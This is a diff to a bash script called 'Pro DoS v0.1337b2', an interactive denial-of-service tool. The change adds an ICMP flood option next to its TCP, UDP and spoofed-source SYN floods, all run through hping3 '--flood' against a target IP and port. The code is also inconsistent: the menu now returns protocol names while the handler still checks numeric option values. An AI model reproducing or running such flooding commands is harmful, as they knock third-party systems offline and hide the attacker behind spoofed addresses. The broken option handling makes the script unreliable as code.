@@ -8,12 +8,15 @@ LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_HISTORY_FILE} | awk '{printf $
 UDP=off
 TCP=off
 SYN=off
-if [ ${LAST_PROTOCOL} = 1 ]; then
+ICMP=off
+if [ ${LAST_PROTOCOL} = TCP ]; then
     TCP=on
-elif [ ${LAST_PROTOCOL} = 2 ]; then
+elif [ ${LAST_PROTOCOL} = UDP ]; then
     UDP=on
-elif [ ${LAST_PROTOCOL} = 3 ]; then
+elif [ ${LAST_PROTOCOL} = SYN ]; then
     SYN=on
+elif [ ${LAST_PROTOCOL} = ICMP ]; then
+    ICMP=on
 fi
 
 if [ ${TCP} = on ]; then
@@ -23,6 +26,8 @@ elif [ ${UDP} = on ]; then
 elif [ ${SYN} = on ]; then
     PROTOCOL=TCP
     SYN=true
+elif [ ${ICMP} = on ]; then
+    PROTOCOL=ICMP
 fi
 BACKTITLE="Pro DoS v0.1337b2"
 function func_history {
@@ -63,10 +68,11 @@ if [ "$1" = "History" ] || [ "$1" = "history" ]; then
     cd ${LAST_DIR}
 fi
 #7:58PM 13/01/2012
-opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 10 30 3 \
-1 TCP ${TCP} \
-2 UDP ${UDP} \
-3 SYN ${SYN} \
+opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 11 30 4 \
+TCP TCP ${TCP} \
+UDP UDP ${UDP} \
+SYN SYN ${SYN} \
+ICMP ICMP ${ICMP} \
 --stdout`
 
 function main {
@@ -109,4 +115,8 @@ elif [ "${opt}" = "3" ]; then
     echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/.last_dos
     countdown
     hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
+elif [ "${opt}" = "4" ]; then
+    main
+    countdown
+    hping3 --icmp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
 fi
